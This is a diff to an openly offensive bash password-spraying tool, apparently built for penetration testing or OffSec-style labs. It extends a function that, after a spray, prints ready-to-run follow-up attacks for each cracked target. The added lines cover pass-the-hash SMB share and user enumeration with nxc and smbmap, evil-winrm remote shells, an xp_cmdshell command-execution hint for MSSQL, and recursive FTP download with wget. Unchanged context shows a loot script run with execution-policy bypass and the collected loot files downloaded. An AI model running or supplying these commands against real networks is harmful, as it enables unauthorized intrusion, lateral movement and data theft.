@@ -431,8 +431,8 @@ generate_next_steps() {
         echo "────────────────────────────────────────────────────────────"
 
         local proto target cred flag
-        local first_smb_pwnd="" first_winrm_pwnd="" first_rdp_hit="" first_ssh_hit=""
-        local first_mssql_hit="" first_ldap_hit=""
+        local first_smb_pwnd="" first_smb_hit="" first_winrm_pwnd="" first_winrm_hit=""
+        local first_rdp_hit="" first_ssh_hit="" first_mssql_hit="" first_ldap_hit="" first_ftp_hit=""
         local hit_user=""
 
         while IFS='|' read -r proto target cred flag; do
@@ -443,8 +443,14 @@ generate_next_steps() {
                 smbPWND)
                     [[ -z "$first_smb_pwnd" ]] && first_smb_pwnd="${target}|${hit_user}"
                     ;;
+                smb*)
+                    [[ -z "$first_smb_hit" ]] && first_smb_hit="${target}|${hit_user}"
+                    ;;
                 winrmPWND)
                     [[ -z "$first_winrm_pwnd" ]] && first_winrm_pwnd="${target}|${hit_user}"
+                    ;;
+                winrm*)
+                    [[ -z "$first_winrm_hit" ]] && first_winrm_hit="${target}|${hit_user}"
                     ;;
                 rdp*)
                     [[ -z "$first_rdp_hit" ]] && first_rdp_hit="${target}|${hit_user}"
@@ -457,6 +463,9 @@ generate_next_steps() {
                     ;;
                 ldap*)
                     [[ -z "$first_ldap_hit" ]] && first_ldap_hit="${target}|${hit_user}"
+                    ;;
+                ftp*)
+                    [[ -z "$first_ftp_hit" ]] && first_ftp_hit="${target}|${hit_user}"
                     ;;
             esac
         done < "$hits_file"
@@ -503,6 +512,24 @@ generate_next_steps() {
             fi
         fi
 
+        # SMB non-admin/valid creds
+        if [[ -n "$first_smb_hit" && -z "$first_smb_pwnd" ]]; then
+            local smb_hit_t="${first_smb_hit%|*}"
+            local smb_hit_u="${first_smb_hit##*|}"
+            echo ""
+            echo "# Valid SMB credentials (non-admin or no Pwn3d marker):"
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -H ${NT_HASH} --shares"
+                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -H ${NT_HASH} --users"
+                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -H ${NT_HASH} --groups"
+            else
+                local q_smb_hit_pass; printf -v q_smb_hit_pass '%q' "$AUTH_PASS"
+                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -p ${q_smb_hit_pass} --shares"
+                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -p ${q_smb_hit_pass} --users"
+                echo "  smbmap -H ${smb_hit_t} -u ${smb_hit_u} -p ${q_smb_hit_pass}"
+            fi
+        fi
+
         # WinRM admin
         if [[ -n "$first_winrm_pwnd" ]]; then
             local wrm_t="${first_winrm_pwnd%|*}"
@@ -522,6 +549,22 @@ generate_next_steps() {
             echo "  powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot"
             echo "  download C:\\Windows\\Temp\\loot\\summary.txt"
             echo "  download C:\\Windows\\Temp\\loot\\attack_commands.txt"
+        fi
+
+        # WinRM valid login without explicit admin marker
+        if [[ -n "$first_winrm_hit" && -z "$first_winrm_pwnd" ]]; then
+            local wrm_hit_t="${first_winrm_hit%|*}"
+            local wrm_hit_u="${first_winrm_hit##*|}"
+            echo ""
+            echo "# Valid WinRM credentials:"
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                echo "  evil-winrm -i ${wrm_hit_t} -u ${wrm_hit_u} -H ${NT_HASH}"
+                echo "  nxc winrm ${wrm_hit_t} -u ${wrm_hit_u} -H ${NT_HASH} -x whoami"
+            else
+                local q_wrm_hit_pass; printf -v q_wrm_hit_pass '%q' "$AUTH_PASS"
+                echo "  evil-winrm -i ${wrm_hit_t} -u ${wrm_hit_u} -p ${q_wrm_hit_pass}"
+                echo "  nxc winrm ${wrm_hit_t} -u ${wrm_hit_u} -p ${q_wrm_hit_pass} -x whoami"
+            fi
         fi
 
         # RDP
@@ -570,6 +613,8 @@ generate_next_steps() {
             else
                 echo "  nxc mssql ${sql_t} -u ${sql_u} -p '${AUTH_PASS}' -q 'SELECT @@version'"
             fi
+            echo "  # If login is privileged, check command execution:"
+            echo "  # SQL> EXEC xp_cmdshell 'whoami'"
         fi
 
         # LDAP — domain creds
@@ -584,6 +629,17 @@ generate_next_steps() {
             else
                 echo "  ./adr.sh -d ${dom} -u ${ldp_u} -p '${AUTH_PASS}' -dc ${ldp_t}"
             fi
+        fi
+
+        # FTP
+        if [[ -n "$first_ftp_hit" ]]; then
+            local ftp_t="${first_ftp_hit%|*}"
+            local ftp_u="${first_ftp_hit##*|}"
+            echo ""
+            echo "# FTP access:"
+            echo "  ftp ${ftp_t}"
+            echo "  lftp -u ${ftp_u},'${AUTH_PASS:-<PASS>}' ftp://${ftp_t}"
+            echo "  wget -r ftp://${ftp_u}:'${AUTH_PASS:-<PASS>}'@${ftp_t}/"
         fi
 
         echo ""
@@ -1173,5 +1229,9 @@ main() {
         warn "Spray complete — no valid credentials found"
     fi
 }
+
+if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
+    return 0 2>/dev/null || exit 0
+fi
 
 main "$@"
